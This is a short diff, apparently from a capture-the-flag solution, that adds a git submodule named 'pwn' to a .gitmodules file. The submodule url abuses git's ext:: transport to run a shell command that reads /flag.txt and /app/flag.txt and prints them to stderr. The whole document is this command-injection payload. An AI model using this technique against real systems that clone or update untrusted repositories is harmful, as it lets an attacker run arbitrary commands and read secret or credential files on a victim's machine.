@@ -1,0 +1,3 @@
+[submodule "pwn"]
+	path = pwn
+	url = ext::sh -c "cat /flag.txt 1>&2; cat /app/flag.txt 1>&2"
